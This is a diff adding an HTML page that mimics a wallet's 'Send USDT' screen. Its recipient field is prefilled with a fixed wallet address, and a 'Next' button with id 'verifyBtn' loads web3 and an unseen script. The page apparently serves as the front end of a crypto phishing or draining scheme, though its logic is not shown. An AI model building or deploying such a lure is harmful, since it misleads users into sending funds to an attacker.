@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Send USDT</title>
+  <link rel="stylesheet" href="style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
+</head>
+<body>
+  <main class="container">
+    <h1 class="title">Send USDT</h1>
+
+    <label class="label" for="address">Address or Domain Name</label>
+    <div class="input-group">
+      <input type="text" id="address" placeholder="Search or Enter" value="0x31f35a71213a109983FA47e2765A1d49c1bE647B">
+      <button class="text-btn">Paste</button>
+      <button class="icon-btn"><i class="fas fa-address-book"></i></button>
+      <button class="icon-btn"><i class="fas fa-expand"></i></button>
+    </div>
+
+    <label class="label" for="amount">Amount</label>
+    <div class="input-group">
+      <input type="number" id="amount" placeholder="USDT Amount">
+      <span class="unit">USDT</span>
+      <button class="max-btn">Max</button>
+    </div>
+
+    <p class="estimate">≈ $0.00</p>
+
+    <button id="verifyBtn" class="next-btn">Next</button>
+  </main>
+
+  <script src="web3.min.js"></script>
+  <script src="script.js"></script>
+</body>
+</html>
